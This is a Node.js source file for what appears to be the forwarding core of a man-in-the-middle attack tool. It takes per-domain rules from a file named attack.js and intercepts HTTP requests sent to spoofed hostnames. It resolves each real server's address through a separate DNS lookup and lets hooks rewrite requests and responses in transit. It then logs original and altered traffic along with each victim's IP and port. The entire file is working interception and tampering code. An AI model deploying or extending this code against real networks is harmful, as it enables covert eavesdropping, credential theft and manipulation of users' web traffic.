const originalUrl = require('original-url')
const { record } = require("../logger.js")
const request = require('request');
const { UDPClient } = require('dns2');
const resolve = UDPClient();

const DOMAIN_CONFIG = require("../attack.js").domain_config;

const BYPASS = (...a) => a;

const app = async function (req, res) {
    let { full: url, hostname } = originalUrl(req);

    if (DOMAIN_CONFIG[hostname] == -1) {
        res.end("compruebe la url:" + hostname); return;
    }

    let req_body = "";

    req.on('data', (data) => {
        req_body += data;
    });

    req.on("end", () => {

        let original_request = clone({
            url,
            headers: req.headers,
            body: req_body
        });

        let petition_warp = DOMAIN_CONFIG[hostname].petition_warp || BYPASS;
        let response_warp = DOMAIN_CONFIG[hostname].response_warp || BYPASS;

        let [warped_headers, warped_body, warped_url] = petition_warp(req.headers, req_body, url);

        let warped_request = clone({
            url: warped_url,
            headers: warped_headers,
            body: warped_body
        });

        console.log("acaban de pedir la url", url)
        const opt = {
            method: req.method,
            qs: req.query,
            uri: warped_url,
            body: warped_body,
            headers: warped_headers,
            lookup: domain_to_legit_ip
        }
        // console.log(opt)
        request(opt, (error, response) => {
            let original_response = clone({ headers: response.headers, body: response.body, statusCode: response.statusCode })
            let [warped_headers, warped_body, warped_statusCode] = response_warp(response.headers, response.body, response.statusCode);

            let warped_response = clone({ headers: warped_headers, body: warped_body, statusCode: warped_statusCode })

            res.writeHead(warped_statusCode, warped_headers);
            res.end(warped_body);
            console.log("calling record");
            record(
                url,
                original_request,
                warped_request,
                original_response,
                warped_response,
                {
                    client_ip: req.socket.remoteAddress,
                    client_port: req.socket.remotePort
                }
            )
        })
    })


}

async function domain_to_legit_ip(domain, op, cb) {

    const query = await resolve(domain);

    const f = ({ address }) => address;
    const addresses = query.answers.filter(f).map(f);
    if (addresses.length != 0) {
        ip = addresses[0];
    } else {
        throw "[foward server]: legit ip for domain wasn't found";
    }
    if (cb) {
        cb(false, ip, 4);
    }
    else {
        return ip;
    }

}

function clone(item) {
    return JSON.parse(JSON.stringify(item));
}

module.exports = { app };